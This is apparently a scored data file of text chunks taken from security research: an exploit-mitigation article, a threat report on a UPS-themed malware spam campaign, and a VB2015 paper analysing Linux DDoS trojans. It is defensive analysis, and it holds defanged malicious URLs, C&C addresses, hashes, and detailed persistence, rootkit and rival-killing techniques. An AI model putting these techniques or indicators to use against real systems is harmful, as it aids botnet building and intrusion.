"One example of a mitigation tool is EMET (Enhanced Mitigation Experience Toolkit) from Microsoft. EMET makes life much more difficult for exploits (in fact, renders many of them defunct) by protecting against common techniques used by exploits and forcing built-in Windows security measures, namely DEP (Data Execution Prevention), ASLR (Address Space Layout Randomization) and SEHOP (structured exception handler overwrite protection).",0.021338304117383577
"Modern antivirus solutions introduce a more generic behavior-based approach, inspecting the very act of exploitation and checking if, for example, a (malicious) process is spawned in a suspicious manner that‘s not typical for the host application. This technology can block advanced and reliable exploitation techniques, typically bundled in today’s professional exploit kits.",0.011957772871960093
"One of such examples is CVE-2013-0641, which was the winner of the 2013 Pwnie Awards at the BlackHat conference for the most technically sophisticated and interesting client-side bug. This exploit targeted Adobe Reader and was able to escape its sandbox. Apart from PDF readers, the other most exploited applications by malware include internet browsers and their plugins, Flash players, Java and MS Office components. This kind of approach can also help prevent zero-day exploits.",0.010843555692086726
"But blocking exploits doesn’t only have to take place at the process level. For example, many worms still rely on network protocol vulnerabilities in order to spread. While there are many more fresh examples of this, the most infamous one is probably the Conficker worm exploiting MS08-067 through a specially crafted RPC call. Despite the fact that this vulnerability has been patched for 5 years now, our LiveGrid telemetry shows us that the exploit is still widely used in the wild. This indicates that adding another, network layer to the protection stack, is also beneficial.",0.01099975411466192
Conclusion,0.008171308922719556
"We’ve addressed some of the technical tricks that malware authors use to successfully infiltrate target systems without being detected. The descriptions above apply both to mass-scale attacks, as well as customized targeted attacks, with an important side-note. A targeted attack is much more difficult to prevent, since the attacker knows his victim and can tailor the attack using very focused social engineering and exploits against the exact software that the victim is running, and so on. Targeted attacks especially highlight the importance of multi-layered security and the usefulness of generic exploitation detection.",0.01615131486945709
"This article did not discuss the most widely used malware spreading technique today: the use of social engineering. We constantly see fresh evidence that this technique is easier and cheaper for attackers in many cases. But that’s for another article, or two.
",0.013126379997194126
"Cybercriminals are currently spamvertising millions of emails impersonating United Parcel Service (UPS) in an attempt to trick end and corporate users into clicking on exploits and malware serving links found in the malicious emails. What exploits are they using? How widespread is the campaign? Is it an isolated incident, or is the campaign linked to more malicious activity?
More details:",0.01272060749911863
Screenshots of the spamvertised campaign:,0.009811535848109454
"Upon clicking on the link, users are exposed to the following bogus page displaying additional information about the package:",0.009895251530290361
"Sample spamvertised malicious URLs: hxxp://andreascookies.com/deliv.html; hxxp://selcoelectrical.co.uk/deliv.html; hxxp://nepa.com.np/deliv.html; hxxp://it-agency-job-opportunities.com//track.html; hxxp://agarcia.tv/wp-content/uploads/fgallery/track.html; hxxp://samsung40lcdtvlnt4061f.uwcblog.com/spss.html
Detection rate for the client-side exploit serving page: devil.html – MD5: f9a47465f88bb76d1987fba6ffc72db7 – detected by 2 out of 42 antivirus scanners as JS/Obfuscus.AACB!tr; HEUR:Trojan.Script.Generic",0.010956584973550565
"Client-side exploitation chain: hxxp://savecoralz.net/main.php?page=2a709dab1e660eaf -> hxxp://savecoralz.net/Set.jar
Second client-side exploitation chain seen in the same campaign: hxxp://abilenepaint.net/main.php?page=c3c45bf60719e629 -> hxxp://abilenepaint.net/Half.jar
Upon clicking on the link, the campaign is serving client-side exploits using the Black Hole web malware exploitation kit, and in this particular campaign it’s attempting to exploit CVE-2010-1885 and CVE-2012-0507.
Once the client-side exploitation takes place, the campaign drops MD5: 202d24597758dc5f190bf63527712af0 – detected by 2 out of 42 antivirus scanners as Trojan/Win32.Hrup; Suspicious.Cloud.5
Info on the client-side exploit serving domain: savecoralz.net – 109.164.221.176; 46.162.27.165; name servers: NS1.GRAPECOMPUTERS.NET; NS2.GRAPECOMPUTERS.NET – Email: clinicadelta@aol.com
The following malware-serving domains are also using the same name servers:
synergyledlighting.net
stafffire.net
thai4me.com
energirans.net
hapturing.net
housespect.net
synetworks.net
110hobart.com
perikanzas.com
abc-spain.net
migdaliasbistro.net
themeparkoupons.net
icemed.net
sony-zeus.net
mynourigen.net
georgekinsman.net
ekotastic.net
torsax.net
popzulu.net
arizonacentennialmens.com
Info on the second client-side exploits serving domain observed in the campaign: abilenepaint.net – 79.142.67.135 (known to have also responding to 109.169.86.139 (stafffire.net) – Email: ezvalu@live.com Name servers: ns1.asiazmile.net, ns2.asiazmile.net
More domains known to be using the same name servers as abilenepaint.net
stafffire.net
alamedapaint.net
asiazmile.net
Client-side exploitation chain: hxxp://abilenepaint.net/main.php?page=c3c45bf60719e629 -> hxxp://abilenepaint.net/Half.jar
Upon successful client-side exploitation the second malicious URL drops MD5: 5e187c293a563968dd026fae02194cfa, detected by 3 out of 42 antivirus scanners as PAK_Generic.001. Upon execution it creates the following file:
%AppData%KB00121600.exe – MD5: 5E187C293A563968DD026FAE02194CFA – detected by 3 out of 42 antivirus scanners as PAK_Generic.001
Upon execution, the sample phones back to 123.49.61.59/zb/v_01_b/in on port 8080. Another sample is known to have phoned back to the same URL, namely, MD5: 108F10F0921F2B4FCA87FE6E620D21EF which phones back to:
hxxp://123.49.61.59:8080/zb/v_01_a/in/
hxxp://91.121.103.143:8080/zb/v_01_a/.upd/u2006a.exe
u2006a.exe has a MD5 of MD5: c5fcee018e9b80a2574d98189684ba2a, and is detected by 4 out of 42 antivirus scanners as Worm.Win32.AutoRun.dtaf.
This is the second UPS themed campaign that we’ve intercepted during June, 2012. In the first campaign, the cybercriminals used malicious .html attachments compared to directly linking to exploits and malware serving sites like we’ve seen in the latest campaign.
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.010458136052439837
VB2015 paper: DDoS Trojan: A Malicious Concept that Conquered the ELF Format,0.01057229524096881
Peter Kálnai & Jaromír Hořejší,0.016550581994647207
"Avast Software, Czech Republic",0.008062335279885313
Copyright © 2016 Virus Bulletin,0.009767502707145992
Abstract,0.009485057568311417
"DDoS threats have been around ever since the Internet took over half of global communications, posing the real problem of denial of access to online service providers. Recently, a new trend has emerged in non-Windows DDoS attacks that has been induced by code availability, lack of security and an abundance of resources. The attack infrastructure has undergone significant changes in structure, function and complexity. Malware has evolved into complex and relatively sophisticated pieces of code, employing compression, advanced encryption and even rootkit capabilities. Targeted machines are those running systems supporting the ELF format – anything from desktops and servers to IoT devices such as routers or digital video recorders (DVRs) could be at risk.",0.01680157950536365
"In this paper, we will look at the current state of DDoS trojans forming covert botnets on unsuspecting systems. A technical analysis of the most important malware families will be provided, with a specific focus on infection methods, dynamic behaviour, C&C communication, obfuscation techniques, advanced methods of persistence and stealth, and elimination of rivals. We will study cybercriminals' behaviour and introduce their operation tools, including vulnerability scanners, brute-forcers, bot builders and C&C panels. In many cases, it's unnecessary to apply reverse engineering within the analysis – the original source codes are indexed in public search engines and their customization is a subject of monetization. Finally, we will discuss tracking methods and techniques and reveal the targets of these attacks.",0.014123143844390729
1. Introduction,0.009670202428696317
"Today, both desktop users and organizations face various types of cyber attacks including credential theft, spam distribution, click fraud and denial of services (DoS). These are all usually performed via a series of zombie computers in a malicious botnet controlled by cybercriminals. Distributed DoS (DDoS) attacks are carried out using various methods such as volumetric flooding, slow HTTP attacks or TCP protocol misuse. A DNS amplification is an example of volumetric flooding that has become popular recently. Certain trojans for the Windows platform with resources containing Chinese symbols have a long tradition of use in this type of attack and lack other spying features that trojans often possess (cf. [1]).",0.019434252020811282
"Implementations of flooding procedures have been available for a long time on Chinese source-code sharing services, especially in C/C++. Until recently, the shared sources were usually compiled as DDoS tools exclusively for the Windows platform. Crossing to another platform like Linux is not a complicated process though, and we have observed that many of these tools have been ported. These tools are not necessarily invasive trojan-type malware. However, they come with an additional framework (often on a different platform from the flooding tools) that provides an attacker with the possibility of forming a malicious botnet. The framework consists of C&C panels, bot builders, installation scripts, port scanners, SSH brute-forcers, etc. In our paper we provide a survey of current Linux DDoS bots and we sketch a wider context of usage of the above-mentioned components. This topic has been covered by many independent security researchers, e.g. the MalwareMustDie! group summarised their series of blog posts in [2]. The authors presented its early development in [21].",0.01509437652919654
2. Common Characteristics,0.010775835078850382
2.1 About the ELF format,0.010032795523246096
"ELF is short for 'Executable and Linkable Format', which is a common standard format for executables under Unix systems. The instruction set architecture (ISA) of the binary is stored at the offset e_machine, and we refer to this parameter using the prefix 'EM_'. Unix systems power not only desktop and server machines, but are also the main operating systems for embedded devices. Although Intel 80386 (EM_386) and AMD64 (EM_x86_64) ISAs are the most common for desktops and servers, the situation for embedded devices is completely different – the devices may run on different ISAs, such as EM_ARM or EM_MIPS. Cross-compilation of malicious binaries to the latter platforms is done with the aim of extending the group of potential victims to target a wider range of devices.",0.012984909882273632
2.2 Static properties,0.01151652360117461
"We found that debugging symbols were often not stripped from ELF executables and thus revealed a lot about their functionality, especially the procedure names. The unstripped binaries listed in the Appendix were chosen intentionally so that we could review their features easily. At the same time, plain ELF binaries were occasionally encapsulated with the well-known UPX compression [4], which produced a certain level of polymorphism for the distributors. There were cases when packed executables were altered in such a way that the official tool did not decompress them (e.g. some chosen samples from the Sotdas and MrBlack families referred to in the Appendix). These modifications targeted the UPX header, which is located at the tail of the file. The changed parameters were the UPX magic string, various checksums, file sizes or decompression methods. Dynamic behaviour was not affected.",0.015208719705568363
Infected embedded devices do not often hide the presence of the malware – debug information might be displayed directly on the standard console output.,0.01219072376876984
2.3 Autostart,0.007603326342270678
"All programs and tools below are involved in malicious activities, but in a strict sense we consider a DDoS trojan as a DDoS tool with an autostart feature. There are more common methods for bots to handle their persistence. This is done by creating symbolic links or executable scripts in the following directories:",0.01126761331534909
(AS1) /etc/init.d/ – the central repository of all startup scripts.,0.012877092397601597
"(AS2) /etc/cron.<S>/, where S is a period (hourly, daily, monthly, weekly). Additionally, a service might be added to run in the cron (/etc/crontab).",0.017389349241378027
"(AS3) /etc/rc<N>.d/, where N is the run level indicator (0–6). Alternatively, the desired path can be added to
/etc/rc.local to run it once at boot time before all other scripts.",0.010736972204153594
3. Cybercriminals' Operation Tools,0.01080991764973438
"Distribution starts with either an automated SSH brute-forcing of various Windows and Linux servers or vulnerability scanning and exploiting using the hacking tools and password lists mentioned below. If successful, flooding tools are downloaded and installed onto the hacked servers.",0.01119160560347332
The installation process can consist of several steps:,0.009608826012702076
determining susceptibility to known vulnerabilities of the system,0.00516328779719033
killing competing time-consuming processes,0.01042492074115664
establishing autostart,0.009301125424076018
disabling firewalls.,0.015279774255552714
"We found that it was not unusual for flooding and control components to be offered freely as web server stress tests, with a warning that discourages any malicious use. However, authors looking for monetization of their tools offer customization of attack preferences and their control framework in return for a fee.",0.011803619120789088
3.1 Bot builders and C&C panels,0.008969487406853438
"According to the type of machines that botmasters use to build their botnets, particular C&C panels and bot builders are chosen. They might be restricted to MIPS bots (e.g. MrBlack) or more heterogeneous with support for Linux, Windows and FreeBSD (e.g. Elknot). A bot builder is designed to set up bot details easily (e.g. the IP address of the C&C, port number, encryption keys, etc.). The builder generates the final binary from a binary template, and after execution it is displayed in the control panel. The control panels are in the form of Windows executables.",0.014154362399264264
"The acquired builders are written and run under Windows OS, although they may produce binaries for both Windows and Linux. A few examples are as follows:",0.013810416111697088
"Chicken Builder (see
Figure 1
)",0.009171591666023216
Text-Box Builder & Manager,0.008427629776724177
"MrBlack Builder (see
Figure 2
)",0.009251426174722077
Figure 1: Example of Chicken Builder for Elknot.,0.014496143445632326
Figure 2: Example of MrBlack Builder.,0.015545272827450551
The existence of bot-building tools is consistent with the enormous number of existing samples that differ only in settings such as C&C domains.,0.013518359636951138
3.2 HFS listings,0.008796944331705525
"A good insight into the distribution chain was provided by file listings displayed as the web content of an HTTP file server (an HFS listing) that was established on a possibly compromised machine. The listings contained various groups of files, starting with port scanners, vulnerability scanners, login/password brute-forcers, password lists, lists of targeted IPs and SSH clients, and ended with the proper flooding tools, bot builders and C&C panels. Sometimes we even noticed text files with IP addresses of servers followed by the default names and passwords. These servers were clearly using the default credentials and were therefore accessible to anyone knowing the name/password combination. Additional crucial information provided by the HTTP file servers was the exact number of downloads of each file, giving us a chance to estimate the size of botnets.",0.013962743539416511
Figure 3: An HFS panel used for distribution of malware – the number of downloads is shown in the right column.,0.012843103933827149
3.3 Brute-forcers and vulnerability scanners,0.007282456919637692
"Figure 4 shows an SSH brute-forcer, where attackers can enter a list of IP addresses and a password list, as well as specifying other parameters of the attack.",0.010663497089059226
Figure 4: An SSH brute-forcer. Attackers enter an IP list and password list and specify other parameters of the attack.,0.014021081412049274
"Figure 5 shows a vulnerability scanner for Apache Struts, which was found together with Chinaz samples.",0.010653161241238829
Figure 5: A vulnerability scanner for Apache Struts found together with Chinaz samples.,0.011360788403054212
4. DDoS Trojans in the ELF Malware Space,0.01054818835742577
"It should not come as a surprise that ELF malware is not the same as its Windows counterpart. This is due to the fact that most Windows malware runs on a machine where a user performs personal actions, so info-stealers and banking trojans make sense. ELF malware often targets devices that are not accessed by a real user. Therefore, it makes sense to misuse the device's power for tasks like denial of service, bitcoin mining or proxy networking and anonymization. Figure 6 sketches the total ELF malware space based on Avast's internal data, where the nodes represent particular malware families proportional to the number of unique samples and the edges are present if the corresponding families share a signature. The picture has been manipulated to omit very old viruses, potentially unwanted applications, and nodes with fewer than 10 unique hashes for the sake of leaving only relevant and interesting data.",0.01397791143702698
Figure 6: ELF malware space.,0.019119108666368567
"Based on the similarity of features we tried to group all the bots into several clusters. Most of them also exist as Windows variants, but those will not be discussed.",0.012346331455434734
4.1 Elknot/Setag,0.00758947920429609
"With the highest incidence among any ELF malware family (~1400 unique samples), Elknot/Setag is among the most popular malware distributed by attackers. There are two main variants in this family, both of which were written in the modular C++ language. Bots of this type run on Windows x86/x64, Linux x86/x64 and FreeBSD systems. Although the variants differ in complexity, we grouped them into one family because their Windows versions have significantly similar debug info. They also have a very similar command grammar. A detailed analysis was provided by Kaspersky's Mikhail Kuzin in [5].",0.012787313519773247
4.1.1 Simple variant,0.00730784386835015
This variant usually comes as an on-the-fly patcher of an embedded DDoS tool. Its purpose is to replace itself with a dropped bot that has the C&C server and the port number carried from the patcher. These data are encrypted with a simple substitution cipher based on adding one from characters on odd positions and subtracting one from characters on even positions.,0.011862889929800113
"The tool itself is characterized by the presence of the files fake.cfg or xmit.ini, which contain information such as the attack status, the ranges of outgoing IP addresses and ports, or a domain name for a DNS flood. All network communication is a part of the CNetBase class. The commands supported are ReadTask, StopTask, ReadFake and DestroySocket, and are implemented in the main CManager class.",0.009696503546813506
4.1.2 Variant Setag,0.008087545415303765
"This more sophisticated trojan-type bot usually contains the character strings 'Bill' and 'Gates'. It recognizes four types of execution: MainBackdoor, MainSystool, MainMonitor and MainBeikong.",0.019130182504474846
"Type MainBackdoor:
A bot running this type of execution is called as the /usr/bin/bsd-port/getty file. At first it decrypts a hard-coded configuration using RSA‑1024 (the configuration settings are computed as a solution to the equation P ^ Q % N, where P and Q are primes and N is modulus). The SetAutoStart procedure creates the selinux script in (AS1) and multiple links under the name S99selinux in (AS3). The HandleSystools method of the CSystool class replaces the system tools /bin/netstat, /bin/lsof, /bin/ps, /usr/bin/netstat, /usr/bin/lsof, /usr/bin/ps, /usr/sbin/netstat, /usr/sbin/lsof and /usr/sbin/ps with copies of itself and backs up the original files into the newly created /usr/bin/dpkg/ directory. The proper attack is realized in the MainProcess method of the main CManager class. A list of the IP addresses of DNS servers misused for DNS amplification attacks are stored in the /usr/lib/libamplify.so file. The attacking classes are as follows: CAttackIcmp, CAttackSyn, CAttackUdp, CAttackAmp (DNS amplification), CAttackCC, CAttackDns, CAttackPrx, CAttackCompress, CTcpAttack, CAttackCc, CAttackIe and CAttackTns.",0.01020341242141709
"Type MainSystool:
A bot running this type of execution must be named as one of the systools. This type may be under development because, currently, execution of these replaced commands starts a copy of the trojan but does not ensure its autostart or an alteration of outputs.",0.009996477983229002
"Type MainMonitor:
A bot running this type of execution is executed as the /usr/bin/.sshd file. It spawns an infinite thread which monitors the existence of an instance of the trojan and handles a reinstallation if needed. The PID of a monitored process is loaded from /tmp/gates.lock. If no process with the given PID exists, then the trojan is installed and started again.",0.010567711585641737
"Type MainBeikong:
The features of this type of execution are very similar to those of MainBackdoor. This type is run if the bot has a different name from the three mentioned. The autostart is achieved by the DbSecuritySpt script via (AS1) and by multiple links under the name S97DbSecuritySpt via (AS3). In this mode, the trojan checks whether another instance of malware is running in the system (via the presence of *.lock files containing PIDs ). If so, then it terminates all of them, deletes all .lock files and restarts. This mode is probably used for updates or reinstallation of the trojan.",0.009743632744610098
"The C&C panel is called NFarm and its executable is called xitele, which translates as 'Hitler' in Chinese (see Figure 7).",0.012455755834683724
"Figure 7: Control panel for Elknot family, called xitele.",0.010416605940964385
4.2 MrBlack,0.008259517876390343
"This family involves minimalistic DDoS tools characterized by the main thread _ConnectServer with a subroutine DealwithDDoS that handles the attack. The binaries usually contain character strings such as 'Hacker', 'Mr. Black', 'VERS0NEX' or a typo 'connnect'. The support of Linux architectures is wide (EM_386, EM_x86_64, EM_ARM and EM_MIPS) and compression with UPX is not exceptional. Additional threads could be spawned for collecting CPU and network statistics and reporting them to a C&C server. A detailed analysis was published by Prolexic [6].",0.01026719291046474
Figure 8: Control panel for MrBlack called sword.exe with one connected bot (MIPS).,0.012004262894110607
4.2.1 Aesddos,0.007498279928657814
"Aesddos is a trojan that extends the core functionality provided by MrBlack with C&C communication encrypted with AES. Persistence is realized at the beginning of the execution in the autoboot procedure by stream editing the files /etc/init.d/boot.local (AS1) and /etc/rc.local (AS3). The attack itself is performed via two main threads, backdoorA and backdoorM. The trojan supports the same Linux architectures as MrBlack, but the EM_ x86_64 variant was not observed. A detailed analysis of the MIPS variant is provided by M.J. Bohio [7].",0.0108540420699067
4.2.2 WrkAtk,0.007962993210718916
"This is another trojan subfamily that strongly resembles Aesddos, with two main threads called DoubleDoMain1 and DoubleDoMain2. Its name is derived from the thread AttackWorker, which is responsible for calling the DealwithDDoS subroutine with appropriate parameters. Autostart is achieved using the insert_reboot procedure and is based on the same principle as in the case of Aesddos. The already_running procedure checks that the process is the only instance of the trojan, and the test is done by locking the file /var/run/dos32.pid. The configuration file dosset.dtdb is an additional IoC.",0.010555207551888213
4.3 Iptablesx,0.006528049490675758
"It was observed that a DDoS trojan has been spread by exploiting vulnerable Apache Tomcat, Struts or Elasticsearch software. The functionality of this piece of malware is divided into two parts: an initial binary is responsible for establishing persistence, eliminating an extensive list of rivals (stored in kill.txt or fuckopen.txt) and downloading an additional bot with implemented attack routines. IoCs list a binary /usr/bin/btdaemon, a process .flush, or S90bluetooth symbolic links.",0.007344849652232255
"The proper DDoS bot is written in C and is downloaded as getsetup.rar. Execution parameters are stored in the global variable g_mainsrvinfo of a struct type MAINSRVINFO with entries such as srvver, mainhostip, udpport or Mainisrun. A self-installation is performed into the /boot/ directory with an autostart script called IptabLes/IptabLex in (AS1). The bot then establishes communication with its C&C server. The initial packet contains the memory and CPU statistics of the compromised machine. Once the connection is established and the initial packet has been sent, the bot awaits commands from its control server. The most important DDoS commands are: setlocalip, setrandomip, updatepath, updatesrv, DeleteTask and DeleteAllTask. Observed types of attacks include volumetric SYN_Flood and DNS_Flood. Detailed analyses have been provided by Prolexic [8] and MalwareMustDie! [9].",0.01354551057888398
4.4 Sotdas,0.009359852676734004
"This family is characterized by the presence of the strings 'g_nIsStopDDOS', 'DOSSTAT' or '# chkconfig: 2345 77 37'. The encryption of particular strings is done in a similar manner to that in which it is done in the Elknot family, but the period of substitution is 3 instead of 2. A self-installation takes care of multiple copies as /etc/.zl and /tmp/.lz<digits> files, where digits are derived from actual time. An autostart script is called .zl in (AS1) and symbolic links are called S77.zl in (AS3) (run levels Halt, Single-user mode and Reboot are omitted). The closefirewall procedure clears the environment for the trojan by disabling network filters (by stopping SuSEfirewall2 and disabling ufw) and terminating competing DDoS processes (obviously targeting IoCs of Iptablesx). The related binaries are often compressed with modified UPX. A detailed analysis has been published by Dr.Web [10].",0.011275008138950549
4.5 Gafgyt,0.007717341278277945
"This is an alternative name for the Lizard Stresser DDoS tool advertised by the Lizard Squad group [11]. It is capable of infecting a variety of devices running on Linux. In-the-wild usage of the Bash Bug, a.k.a Shellshock vulnerability (CVE-2014-6271), was observed to install Gafgyt's binaries onto a compromised system [12]. The source code of this IRC bot was leaked in January 2015. The support of architectures is the widest as the installation script downloads cross-compiled bots for EM_386, EM_x86_64, EM_SPARC, EM_PPC, EM_SH, EM_ARM, EM_MIPS and EM_68K. Examples of implemented commands together with an explanation for each are shown in Table 1.",0.00780551135306895
PING,0.008178812100461896
Reply PONG to the server,0.008971375421687022
GETLOCALIP,0.008391788809210987
Get victim's IP,0.009947309243044211
SCANNER,0.008339789315140678
"ON | OFF;
attempts to login to IPs from a generated list and to install itself if successful",0.008471862961562104
UDP,0.008186836572558143
UDP flooding,0.009481437548881422
TCP,0.00872208752736725
TCP flooding,0.009216591706114552
DNS,0.00864990605258309
DNS amplification,0.008706601510998113
KILLATTK,0.009817444533865904
Stop DDoS attack,0.010939839299373588
LOLNOGTFO,0.009368933577238114
Stop the backdoor,0.00797474308548407
Table 1: Some commands implemented in Gafgyt.,0.012068921378262765
Detailed analyses have been published by Dr.Web [13] and Alienvault [14].,0.006737364962543402
4.6 Xorddos,0.0077105970282641545
"This cluster was first discovered in September 2014 [15] and later reported multiple times [16, 17, 18]. Its infection vector starts with SSH brute force attacks for the sake of running an installation script under the root user. The script customizes the installation process and contains procedures like main, check, compiler, uncompress, setup, generate, upload, checkbuild, etc. and variables like __host_32__, __host_64__, __kernel__, __remote__, etc. Three requests are issued to hard-coded C&C servers: the initial GET with anMD5-hashed string containing the name of the kernel version; a GET query with the parameters of a customized binary such as rootkit version and a list of the bot's C&Cs; and the final GET request of a compiled binary. The rootkit component with a complicated server-assisted installation is where Xorddos differs from all the other Linux trojans. Due to the nature of the Linux operating system, knowledge of kernel headers is crucial for loading any kernel module in the victim's machine. In case the hash of the kernel version is unknown to the server, the system's kernel headers are uploaded via a custom uploader and a new rootkit-equipped trojan can be delivered. The rootkit component is based on the open-source Suterusu rootkit, which is also available on Github [19].",0.011116241939358118
"The binary itself is copied into /boot/ under a random name. The name is then used to autostart the binary via (AS1), another script called udev.sh or cron.sh via (AS2), and symblic links called S90%s (where %s is randomly substituted via (AS3). Moreover, a victim might observe another instance of a randomly named binary in the /boot/ constantly being deleted and created again. This behaviour avoids the need to find a single constant process and to apply the kill command.",0.01265978428075476
"The configuration file of the rootkit contains four categories of lists: md5, denyip, filename and rmfile, which mean killing a running process based on its checksum (even though the variable is called md5, the internal implementation is CRC32), on the active communication with an IP from the list, on a filename, and finally removing a file with a specified name. Figure 9 shows part of the config file; marked filenames denote usual competitors such as Elknot, MrBlack, Sotdas or Iptablesx.",0.009764665776588632
Figure 9: Elimination of rivals of Xorddos.,0.014207023473909453
"Figure 10: Control Panel for Xorddos with two connected bots, one EM_386, the second EM_ARM.",0.010811053766931478
The C&C communication is encrypted in both directions with the same hard-coded XOR key (BB2FA36AAA9541F0) – which inspired the trojan's name.,0.012932780986500747
4.7 Chinaz,0.007116019843267707
"This is a collection of DDoS tools with core flooding functionality borrowed from a simple project, DDosClient, available publicly on Github (last update in March 2015). The commands that are supported are at least COMMAND_DDOS_ATTACK and COMMAND_DDOS_STOP, and the attack arsenal lists at least methods including ATTACK_SYN, ATTACK_UDP, ATTACK_ICMP, ATTACK_DNS1 and ATTACK_DNS2. The other character strings are 'DDos ATTACE!', 'SecurtDoor', 'MK32' and 'MK64'. Variants have been observed for multiple platforms: EM_386, EM_x86_64 and EM_MIPS. Samples are often packed by the unmodified UPX tool.",0.014903602511275316
5. Statistics and Victim Preferences,0.009466946385810582
"The number of bots running on Linux platforms was not expected to be high. The size of a botnet could be estimated by data from HFS panels running on different machines. Distributed malicious binaries displayed tens, hundreds, occasionally thousands of downloads. However, that value was just an upper bound as bots might have been reinstalled repeatedly on victims' machines. The situation was similar for botnets of Gafgyt, as [11] revealed.",0.011967282103721444
"Regarding the volume of attacks, the reports [8] and [6] state peaks of 30.10 Gbps/6.75 Mpps for Iptablesx respectively, with 70 Gbps/28 Mpps for MrBlack. A DDoS attack performed by one victim of Xorddos reported in [20] lasted three hours and the amount of data averaged 6.63 Mbps/70 Kbps.",0.012531034075782155
"By knowing the communication protocol and the command grammar it is possible to harmlessly monitor the C&C activity and to log the targets of DDoS attacks. This was applied by a series of Python scripts for the Elknot/Setag family [21]. We have tried a similar approach for the Xorddos family. Among the observed victims were especially online gaming sites, e-commerce shops, online casinos, etc., all of which belonged to Chinese, American or Canadian IP ranges. These services had both the nature of small or medium-sized local businesses and services with a huge anti-DDoS infrastructure. The success of a flooding attack on the unprotected ones was directly observed in terms of the unreachability of a service shortly after the attack command had been issued.",0.009669891655690876
"Targeted IP addresses in the United States or Canada involved infrastructure belonging to Google Cloud [20], CNSERVERS LLC, Global Flag (hosting game servers like Counter Strike or Day of Defeat), CloudFlare; Sharktech; OVH Hosting; Microsoft Hosting, Amazon Cloud; Akamai Technologies, etc.",0.017757955220205845
"What all these services have in common is that their functionality and profitability depend on their ability to stay online and available for customers' requests. When some of the above-mentioned websites suffer a heavy DDoS attack, they become unreachable to their potential users and/or customers. Any time the service is not available causes a financial loss. Therefore the reason for attacking the above-mentioned type of websites is financial – the potential profit is probably based on the extortion of ransom payments.",0.015038311961927842
6. Conclusion,0.011412583037446633
"The number of (trojanized) DDoS tools has escalated quickly since the end of 2013. The potential in devices with undeveloped or no security measures is very attractive for attackers to build botnets. We can also see a variety of projects that wrap the core flooding features. We can expect current bots to be enhanced and even more families to arise in the near future, potentially sharing chunks of already known bots as a consequence of a mixture of available source codes. It's hard to predict whether binaries will display an increased level of polymorphism than just a (modified) UPX compression. For the time being, it seems that malware distributors do not care about AV detection. The security community has started to pay significant attention to these threats.",0.01177218518129941
Acknowledgements,0.0103658076566161
"We would like to thank @benkow_, Christian Rebischke (@Sh1bumi), @threat_inc and Lin Song (University of Iowa) for sharing information and samples. Moreover, we thank the following researchers for openly sharing their threat intelligence: @MalwareMustDie, @TekDefense and @da_667.",0.014328914143833527
References,0.0158494738281566
"[1] Edwards, Nazario. J. A Survey of Contemporary Chinese DDoS Malware, Virus Bulletin 2011 (Barcelona). https://www.virusbulletin.com/conference/vb2011/abstracts/survey-chinese-ddos-malware/.",0.015391697907944368
[2] MalwareMustDie! Tango down report of OP China ELF DDoS'er. September 2014.http://blog.malwaremustdie.org/2014/09/tango-down-report-of-op-china-elf-ddoser.html.,0.012092572717446237
"[3] Kálnai P.; Hořejší J. Chinese Chicken: Multiplatform DDoS botnets, https://www.botconf.eu/wp-content/uploads/2014/12/2014-2.10-Chinese-Chicken-Multiplatform-DDoS-Botnets.pdf.",0.01431149977816526
[4] UPX: the Ultimate Packer for eXecutables. http://upx.sourceforge.net/.,0.014311651175055284
"[5] Kuzin, M. Versatile DDoS Trojan for Linux. July 2014. https://securelist.com/analysis/publications/64361/versatile-ddos-trojan-for-linux/.",0.010831022841853666
[6] Prolexic. Spike DDoS Toolkit. October 2014.http://www.prolexic.com/kcresources/prolexic-threat-advisories/prolexic-threat-advisory-spike-ddos-toolkit-botnet/spike-ddos-toolkit-cybersecurity-A4-092414.pdf.,0.013071519713916069
"[7] Bohio, M. J. Analysis of a MIPS malware. GIAC, SANS Institute. https://www.giac.org/paper/grem/2573/analyzing-backdoor-bot-mips-platform/124977.",0.010599937260539649
[8] Prolexic. IptabLes/IptabLex DDoS Bots. September 2014. http://www.prolexic.com/kcresources/prolexic-threat-advisories/prolexic-ddos-threat-advisory-iptables-iptablex-linux-bots-botnet-cybersecurity/TA-DDos-Binary-Bot-IptabLes-v6-A4.pdf.,0.012541115949251225
[9] MalwareMustDie! ITW Infection of ELF .IptabLex & .IptabLes China #DDoS bots malware. June 2014. http://blog.malwaremustdie.org/2014/06/mmd-0025-2014-itw-infection-of-elf.html.,0.010064120364027818
[10] Dr.Web. Linux.Myk.5. http://vms.drweb.com/virus/?i=4365599.,0.011646152094518358
"[11] Krebs, B. Lizard Stresser Runs on Hacked Home Routers. January 2015. http://krebsonsecurity.com/2015/01/lizard-stresser-runs-on-hacked-home-routers/.",0.014921040313240375
[12] Security Affairs. Hackers target Bash Bug vulnerability in the wild. September 2014.http://securityaffairs.co/wordpress/28626/cyber-crime/hackers-use-bash-bug.html.,0.011486407613404026
[13] Dr.Web. Linux.BackDoor.Fgt.1. November 2014. http://vms.drweb.com/virus/?i=4242198.,0.009197558011052598
"[14] Blasco, J. Attackers exploiting Shellshock (CVE-2014-6721) in the wild. September 2014.https://www.alienvault.com/open-threat-exchange/blog/attackers-exploiting-shell-shock-cve-2014-6721-in-the-wild#sthash.bzInLhax.dpuf;.",0.010151968626018415
[15] MalwareMustDie! Fuzzy reversing a new China ELF Linux/XOR.DDoS. September 2014.http://blog.malwaremustdie.org/2014/09/mmd-0028-2014-fuzzy-reversing-new-china.html.,0.014225077670231734
"[16] Kálnai, P. Linux DDoS Trojan hiding itself with an embedded rootkit. January 2015.https://blog.avast.com/2015/01/06/linux-ddos-trojan-hiding-itself-with-an-embedded-rootkit/.",0.012353377284756939
[17] FireEye. Anatomy of a Brute Force Campaign: The Story of Hee Thai Limited. February 2015. https://www.fireeye.com/blog/threat-research/2015/02/anatomy_of_a_brutef.html.,0.012529864382390898
[18] Level3. It Takes a Village – Collaborative Steps to Breaking Botnets: How Level 3 and Cisco Worked Together to Improve the Internet's Security and Stop SSHPsychos. April 2015. http://blog.level3.com/security/breaking-botnets-how-level-3-and-cisco-worked-together-to-improve-the-internets-security-and-stop-sshpsychos/.,0.013064003335432783
"[19] Github. An LKM rootkit targeting Linux 2.6/3.x on x86(_64), and ARM. https://github.com/mncoppola/suterusu.",0.011598718016290643
[20] Evidence of a DDoS attack. February 2015.https://gist.github.com/Manawyrm/74e687b2a01527725d33.,0.012866887291722695
